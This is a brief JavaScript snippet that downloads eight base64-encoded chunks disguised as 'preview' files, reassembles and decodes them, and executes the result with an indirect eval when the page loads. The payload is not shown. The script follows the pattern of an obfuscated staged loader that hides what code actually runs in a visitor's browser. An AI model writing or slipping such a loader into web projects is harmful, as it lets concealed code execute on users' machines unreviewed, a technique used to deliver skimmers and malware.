(async function () {
  var n = 8;
  var parts = await Promise.all(Array.from({length: n}, function (_, i) {
    return fetch("./mansion-kojihi-preview.h" + i + ".b64?v=22-typefold").then(function (r) { return r.text(); });
  }));
  var bin = atob(parts.join(""));
  var bytes = new Uint8Array(bin.length);
  for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  (0, eval)(new TextDecoder("utf-8").decode(bytes));
})();
